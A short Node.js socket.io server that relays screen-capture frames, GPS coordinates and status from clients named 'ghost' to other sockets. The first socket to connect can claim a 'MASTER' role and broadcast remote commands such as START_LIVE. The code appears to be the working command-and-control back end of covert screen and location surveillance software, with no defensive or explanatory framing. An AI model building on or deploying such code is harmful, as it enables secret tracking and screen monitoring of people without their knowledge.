const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e7 });

let adminId = null;

io.on('connection', (socket) => {
    socket.on('claim_admin', () => {
        if (!adminId) {
            adminId = socket.id;
            socket.emit('role_assigned', { role: 'MASTER' });
        }
    });

    socket.on('register_user', (data) => socket.emit('role_assigned', { role: data.role }));
    socket.on('screen_frame', (f) => socket.volatile.broadcast.emit('stream', f));
    socket.on('ghost_status', (s) => socket.broadcast.emit('ghost_status', s));
    socket.on('ghost_location_data', (c) => socket.broadcast.emit('update_list', { type: 'gps', coords: c }));
    
    socket.on('admin_command', (cmd) => {
        socket.broadcast.emit('admin_command', cmd);
        if (cmd === 'START_LIVE') {
            setTimeout(() => io.emit('admin_command', 'START_ECO'), 300000); // 5m Governor
        }
    });

    socket.on('disconnect', () => { if (socket.id === adminId) adminId = null; });
});

server.listen(process.env.PORT || 10000, '0.0.0.0');
